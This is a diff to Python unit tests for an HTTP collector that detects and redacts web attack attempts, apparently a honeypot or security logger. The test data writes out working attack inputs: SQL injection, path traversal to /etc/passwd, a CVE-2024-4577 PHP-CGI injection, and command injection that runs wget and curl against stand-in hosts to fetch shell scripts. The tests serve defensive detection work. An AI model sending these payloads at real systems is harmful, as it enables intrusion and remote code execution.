@@ -556,6 +556,14 @@ class HttpCollectorSecurityTests(unittest.TestCase):
             ),
             (
                 "GET",
+                "/items?id=1+UNION+SELECT+1,2,3",
+                None,
+                "http-sqli-attempt",
+                "sql_injection",
+                "url",
+            ),
+            (
+                "GET",
                 "/static/../../etc/passwd",
                 None,
                 "http-path-traversal-attempt",
@@ -620,6 +628,14 @@ class HttpCollectorSecurityTests(unittest.TestCase):
                 ["CVE-2024-4577"],
                 "CVE-2024-4577",
             ),
+            (
+                "POST",
+                "/cgi-bin/php-cgi.exe?%ADdallow_url_include%3d1",
+                b"<?php echo 1; ?>",
+                "http-php-cgi-arg-injection-cve-2024-4577",
+                ["CVE-2024-4577"],
+                "CVE-2024-4577",
+            ),
         ]
         # Increase max_body_bytes for Spring4Shell form parameter in body
         self.server.config = dataclasses.replace(self.server.config, max_body_bytes=256)
@@ -665,30 +681,39 @@ class HttpCollectorSecurityTests(unittest.TestCase):
             self.assertNotIn("attack_category", rec)
 
     def test_redacts_command_injection_callback_urls_in_path_and_headers(self) -> None:
-        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
-        conn.request(
-            "GET",
-            "/ping?host=127.0.0.1;wget%20http://cmd-evil.invalid/drop.sh",
-            headers={
-                "User-Agent": "$(curl http://ua-evil.invalid/p.sh)",
-            },
-        )
-        resp = conn.getresponse()
-        resp.read()
-        self.assertEqual(resp.status, 404)
-        conn.close()
+        requests = [
+            (
+                "/ping?host=127.0.0.1;wget%20http://cmd-evil.invalid/drop.sh",
+                {"User-Agent": "$(curl http://ua-evil.invalid/p.sh)"},
+            ),
+            (
+                "/ping?token=supersecret&host=127.0.0.1&&wget%20http://and-evil.invalid/drop.sh",
+                {"User-Agent": "Mozilla/5.0"},
+            ),
+        ]
+        for path, headers in requests:
+            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
+            conn.request("GET", path, headers=headers)
+            resp = conn.getresponse()
+            resp.read()
+            self.assertEqual(resp.status, 404)
+            conn.close()
 
         raw_jsonl = self.output_path.read_text(encoding="utf-8")
         self.assertNotIn("cmd-evil.invalid", raw_jsonl)
         self.assertNotIn("ua-evil.invalid", raw_jsonl)
-        rec = self._read_records()[0]
-        self.assertEqual(rec["attack_category"], "web_attack_attempt")
-        self.assertTrue(
-            any(
-                d["signature_id"] == "http-cmd-injection-attempt"
-                for d in rec["metadata"]["signature_detections"]
+        self.assertNotIn("and-evil.invalid", raw_jsonl)
+        self.assertNotIn("supersecret", raw_jsonl)
+        records = self._read_records()
+        self.assertEqual(len(records), 2)
+        for rec in records:
+            self.assertEqual(rec["attack_category"], "web_attack_attempt")
+            self.assertTrue(
+                any(
+                    d["signature_id"] == "http-cmd-injection-attempt"
+                    for d in rec["metadata"]["signature_detections"]
+                )
             )
-        )
 
     def test_signature_inspection_stays_fast_on_adversarial_inputs(self) -> None:
         adversarial = InspectionInput(
